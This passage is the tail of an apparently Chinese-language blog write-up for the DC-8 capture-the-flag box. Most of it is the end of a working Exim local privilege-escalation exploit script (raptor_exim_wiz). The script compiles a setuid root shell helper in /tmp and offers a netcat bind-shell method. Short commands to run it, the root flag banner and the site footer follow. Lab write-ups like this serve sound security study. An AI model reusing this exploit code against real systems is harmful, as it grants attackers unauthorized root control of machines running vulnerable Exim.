</span></span><span style="display:flex;"><span>        read -u <span style="color:#ae81ff">3</span> <span style="color:#f92672">&amp;&amp;</span> echo $REPLY
</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># print banner</span>
</span></span><span style="display:flex;"><span>echo
</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#39;raptor_exim_wiz - &#34;The Return of the WIZard&#34; LPE exploit&#39;</span>
</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#39;Copyright (c) 2019 Marco Ivaldi &lt;raptor@0xdeadbeef.info&gt;&#39;</span>
</span></span><span style="display:flex;"><span>echo
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># parse command line</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> <span style="color:#f92672">[</span> ! -z <span style="color:#e6db74">&#34;</span>$1<span style="color:#e6db74">&#34;</span> <span style="color:#f92672">]</span>; <span style="color:#66d9ef">do</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> $1 in
</span></span><span style="display:flex;"><span>                -m<span style="color:#f92672">)</span> shift; METHOD<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span>$1<span style="color:#e6db74">&#34;</span>; shift;;
</span></span><span style="display:flex;"><span>                * <span style="color:#f92672">)</span> usage
</span></span><span style="display:flex;"><span>                ;;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">esac</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">done</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> -z $METHOD <span style="color:#f92672">]</span>; <span style="color:#66d9ef">then</span>
</span></span><span style="display:flex;"><span>        usage
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">fi</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># setuid method</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> $METHOD <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;setuid&#34;</span> <span style="color:#f92672">]</span>; <span style="color:#66d9ef">then</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># prepare a setuid shell helper to circumvent bash checks</span>
</span></span><span style="display:flex;"><span>        echo <span style="color:#e6db74">&#34;Preparing setuid shell helper...&#34;</span>
</span></span><span style="display:flex;"><span>        echo <span style="color:#e6db74">&#34;main(){setuid(0);setgid(0);system(\&#34;/bin/sh\&#34;);}&#34;</span> &gt;/tmp/pwned.c
</span></span><span style="display:flex;"><span>        gcc -o /tmp/pwned /tmp/pwned.c 2&gt;/dev/null
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> $? -ne <span style="color:#ae81ff">0</span> <span style="color:#f92672">]</span>; <span style="color:#66d9ef">then</span>
</span></span><span style="display:flex;"><span>                echo <span style="color:#e6db74">&#34;Problems compiling setuid shell helper, check your gcc.&#34;</span>
</span></span><span style="display:flex;"><span>                echo <span style="color:#e6db74">&#34;Falling back to the /bin/sh method.&#34;</span>
</span></span><span style="display:flex;"><span>                cp /bin/sh /tmp/pwned
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">fi</span>
</span></span><span style="display:flex;"><span>        echo
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># select and deliver the payload</span>
</span></span><span style="display:flex;"><span>        echo <span style="color:#e6db74">&#34;Delivering </span>$METHOD<span style="color:#e6db74"> payload...&#34;</span>
</span></span><span style="display:flex;"><span>        PAYLOAD<span style="color:#f92672">=</span>$PAYLOAD_SETUID
</span></span><span style="display:flex;"><span>        exploit
</span></span><span style="display:flex;"><span>        echo
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># wait for the magic to happen and spawn our shell</span>
</span></span><span style="display:flex;"><span>        echo <span style="color:#e6db74">&#34;Waiting 5 seconds...&#34;</span>
</span></span><span style="display:flex;"><span>        sleep <span style="color:#ae81ff">5</span>
</span></span><span style="display:flex;"><span>        ls -l /tmp/pwned
</span></span><span style="display:flex;"><span>        /tmp/pwned
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># netcat method</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">elif</span> <span style="color:#f92672">[</span> $METHOD <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;netcat&#34;</span> <span style="color:#f92672">]</span>; <span style="color:#66d9ef">then</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># select and deliver the payload</span>
</span></span><span style="display:flex;"><span>        echo <span style="color:#e6db74">&#34;Delivering </span>$METHOD<span style="color:#e6db74"> payload...&#34;</span>
</span></span><span style="display:flex;"><span>        PAYLOAD<span style="color:#f92672">=</span>$PAYLOAD_NETCAT
</span></span><span style="display:flex;"><span>        exploit
</span></span><span style="display:flex;"><span>        echo
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># wait for the magic to happen and spawn our shell</span>
</span></span><span style="display:flex;"><span>        echo <span style="color:#e6db74">&#34;Waiting 5 seconds...&#34;</span>
</span></span><span style="display:flex;"><span>        sleep <span style="color:#ae81ff">5</span>
</span></span><span style="display:flex;"><span>        nc -v 127.0.0.1 <span style="color:#ae81ff">31337</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># print help</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>        usage
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">fi</span>
</span></span></code></pre></div><p>把sh脚本传到tmp目录下并运行即可提权：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ ./exploit.sh -m setuid
</span></span><span style="display:flex;"><span>$ ./exploit.sh -m netcat
</span></span></code></pre></div><p>/root/flag.txt：</p>
<pre tabindex="0"><code>Brilliant - you have succeeded!!!



888       888          888 888      8888888b.                             888 888 888 888
888   o   888          888 888      888  &#34;Y88b                            888 888 888 888
888  d8b  888          888 888      888    888                            888 888 888 888
888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888
888d88888b888 d8P  Y8b 888 888      888    888 d88&#34;&#34;88b 888 &#34;88b d8P  Y8b 888 888 888 888
88888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P
8888P   Y8888 Y8b.     888 888      888  .d88P Y88..88P 888  888 Y8b.      &#34;   &#34;   &#34;   &#34;
888P     Y888  &#34;Y8888  888 888      8888888P&#34;   &#34;Y88P&#34;  888  888  &#34;Y8888  888 888 888 888



Hope you enjoyed DC-8.  Just wanted to send a big thanks out there to all those
who have provided feedback, and all those who have taken the time to complete these little
challenges.

I&#39;m also sending out an especially big thanks to:

@4nqr34z
@D4mianWayne
@0xmzfr
@theart42

This challenge was largely based on two things:

1. A Tweet that I came across from someone asking about 2FA on a Linux box, and whether it was worthwhile.
2. A suggestion from @theart42

The answer to that question is...

If you enjoyed this CTF, send me a tweet via @DCAU7.
</code></pre><p>参考资料：</p>
<p><a href="https://www.cnblogs.com/A1oe/p/12585077.html">https://www.cnblogs.com/A1oe/p/12585077.html</a></p>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
    </ul>
  </footer>
</article>
    </main>
    
<footer class="footer">
        <span>&copy; 2025 <a href="http://localhost:1313/">w8nn9z Blog</a></span> · 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
</body>

</html>
